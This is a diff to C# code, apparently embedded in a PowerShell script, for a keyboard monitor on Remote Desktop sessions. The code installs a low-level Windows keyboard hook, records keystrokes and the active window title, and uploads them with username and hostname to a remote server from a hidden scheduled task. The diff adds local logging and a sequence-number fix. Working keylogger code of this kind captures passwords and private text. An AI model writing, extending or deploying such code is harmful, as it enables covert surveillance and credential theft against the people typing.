@@ -136,20 +136,26 @@ public class KeyboardMonitor {
     private static System.Threading.Mutex instanceLock;   // held for process lifetime; blocks a second monitor in the same session
     private static int    pid;          // this process id — lets the server tell duplicate senders apart
     private static int    seq;          // monotonic flush counter — advancing seq with identical keys == a stuck buffer
+    private static readonly object logLock = new object();
 
     public static void Start(string url, string user, string host) {
         // Single-instance guard, scoped to the current session ("Local\" namespace).
         // If a previous monitor is still running in this session (e.g. -Force re-registered
         // the task without killing the old process), this instance exits instead of
         // installing a second hook and double-sending keystrokes.
+        pid = System.Diagnostics.Process.GetCurrentProcess().Id;
+
         bool createdNew;
         instanceLock = new System.Threading.Mutex(true, "Local\\RDSKeystrokeMonitor", out createdNew);
-        if (!createdNew) return;
+        if (!createdNew) {
+            Log("pid=" + pid + " another monitor already owns the session lock — exiting");
+            return;
+        }
+        Log("pid=" + pid + " starting, server=" + url);
 
         serverUrl = url;
         username  = user;
         hostname  = host;
-        pid       = System.Diagnostics.Process.GetCurrentProcess().Id;
 
         flushTimer = new Timer(FLUSH_INTERVAL_MS) { AutoReset = true };
         flushTimer.Elapsed += (s, e) => Flush();
@@ -157,6 +163,7 @@ public class KeyboardMonitor {
 
         proc   = HookCallback;
         hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
+        Log("pid=" + pid + " hook " + (hookId != IntPtr.Zero ? "installed" : "FAILED to install"));
 
         MSG msg;
         while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) {
@@ -218,6 +225,17 @@ public class KeyboardMonitor {
                 .Replace("\n", "\\n").Replace("\r", "\\r").Replace("\t", "\\t");
     }
 
+    // Local diagnostic log — the scheduled task runs hidden and swallows errors,
+    // so upload failures land here instead of vanishing.
+    private static void Log(string msg) {
+        try {
+            lock (logLock) {
+                System.IO.File.AppendAllText("C:\\temp\\keyboard_monitor.log",
+                    DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "  " + msg + "\r\n");
+            }
+        } catch {}
+    }
+
     private static void Flush() {
         string chunk;
         lock (bufLock) {
@@ -225,18 +243,22 @@ public class KeyboardMonitor {
             chunk = buffer.ToString();
             buffer.Clear();
         }
+        int mySeq = System.Threading.Interlocked.Increment(ref seq);
         string json = string.Format(
             "{{\"event_type\":\"keystrokes\",\"username\":\"{0}\",\"hostname\":\"{1}\"," +
             "\"timestamp\":\"{2}\",\"window\":\"{3}\",\"pid\":{4},\"seq\":{5},\"keystrokes\":\"{6}\"}}",
             Escape(username), Escape(hostname),
             DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
-            Escape(ActiveWindow()), pid, System.Threading.Interlocked.Increment(ref seq), Escape(chunk));
+            Escape(ActiveWindow()), pid, mySeq, Escape(chunk));
         try {
             using (var client = new WebClient()) {
                 client.Headers[HttpRequestHeader.ContentType] = "application/json";
                 client.UploadString(serverUrl, json);
             }
-        } catch {}
+            Log("sent seq=" + mySeq + " len=" + chunk.Length);
+        } catch (Exception ex) {
+            Log("send FAILED seq=" + mySeq + " len=" + chunk.Length + ": " + ex.Message);
+        }
     }
 }
 "@
